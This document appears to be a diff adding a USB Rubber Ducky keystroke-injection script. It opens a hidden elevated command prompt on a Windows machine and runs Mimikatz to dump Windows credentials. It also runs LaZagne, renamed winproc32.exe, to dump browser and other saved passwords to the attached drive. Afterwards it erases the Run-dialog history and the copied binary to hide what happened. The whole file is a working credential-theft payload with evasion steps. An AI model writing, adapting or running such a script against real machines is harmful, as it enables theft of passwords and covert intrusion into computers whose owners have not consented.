@@ -1,0 +1,89 @@
+REM Runs mimikatz to get windows creds
+REM and lazagne to get browser creds
+REM Author: Hak5Darren Props: Mubix, Clymb3r, Gentilkiwi
+REM laZagne Edit: ThoughtfulDev
+REM Thanks to: https://www.hak5.org/blog/15-second-password-hack-mr-robot-style
+REM -------------------------------------------------------------------------------------
+REM Drive needs to have the following folders and files
+REM folder DUCKY_DRIVE\data\laZagne and DUCKY_DRIVE\data\mimikatz
+REM lazagne.exe in DUCKY_DRIVE\exec
+REM mimikatz.ps1 in DUCKY_DRIVE\exec
+REM -------------------------------------------------------------------------------------
+DELAY 5000
+ALT F4
+DELAY 500
+ESCAPE
+DELAY 500
+CONTROL ESCAPE
+DELAY 500
+STRING cmd
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT <uac_bypass_key>
+DELAY 1000
+ENTER
+ENTER
+ENTER
+REM -------------------------------------------------------------------------------------
+REM Obfuscate the command prompt
+REM -------------------------------------------------------------------------------------
+STRING mode con:cols=18 lines=1
+ENTER
+STRING color FE
+ENTER
+DELAY 1000
+REM -------------------------------------------------------------------------------------
+REM Get drive letter of drive with label DUCKY
+REM -------------------------------------------------------------------------------------
+STRING for /f %d in ('wmic volume get driveletter^, label^|findstr "DUCKY"') do @set duck=%d
+ENTER
+DELAY 500
+REM -------------------------------------------------------------------------------------
+REM Download and execute Invoke Mimikatz then save results to DUCKY_DRIVE\data\mimikatz\%computername%_creds
+REM -------------------------------------------------------------------------------------
+STRING if exist %duck%\exec\mimikatz.ps1 powershell -NoP -NonI -W Hidden -Exec Bypass "Import-Module %duck%\exec\mimikatz.ps1;Invoke-Mimikatz -DumpCreds|Out-File '%duck%\data\mimikatz\%computername%_creds.txt';"
+ENTER
+REM -------------------------------------------------------------------------------------
+REM Open new cmd for laZagne (wout admin)
+REM -------------------------------------------------------------------------------------
+DELAY 1500
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 2000
+ENTER
+ENTER
+ENTER
+REM -------------------------------------------------------------------------------------
+REM Obfuscate the command prompt
+REM -------------------------------------------------------------------------------------
+STRING mode con:cols=18 lines=1
+ENTER
+STRING color FE
+ENTER
+DELAY 500
+REM -------------------------------------------------------------------------------------
+REM find ducky drive and copy lazagne to tmp execute it and then delete it and history
+REM -------------------------------------------------------------------------------------
+STRING cd %tmp%
+ENTER
+STRING for /f %d in ('wmic volume get driveletter^, label^|findstr "DUCKY"') do @set duck=%d
+ENTER
+STRING del /Q winproc32.exe
+ENTER
+STRING copy %duck%\exec\laZagne.exe winproc32.exe
+ENTER
+DELAY 1000
+STRING winproc32.exe all > %duck%\data\laZagne\%computername%_creds.txt
+ENTER
+DELAY 10000
+STRING reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+ENTER
+STRING del /Q winproc32.exe
+ENTER
+DELAY 500
+STRING exit
+ENTER
+REM -------------------------------------------------------------------------------------
